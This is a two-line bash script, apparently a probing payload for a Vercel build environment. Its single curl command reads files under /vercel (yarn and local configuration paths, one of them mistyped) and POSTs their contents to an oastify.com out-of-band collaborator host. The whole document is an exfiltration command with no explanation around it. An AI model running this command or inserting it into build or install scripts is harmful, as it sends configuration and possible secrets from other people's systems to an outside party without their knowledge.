#!/bin/bash

curl -X POST -d "$(printf '/vercel/.yarn' && cat /vercel.yarn && printf '/vercel/.local' && cat /vercel/.local)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
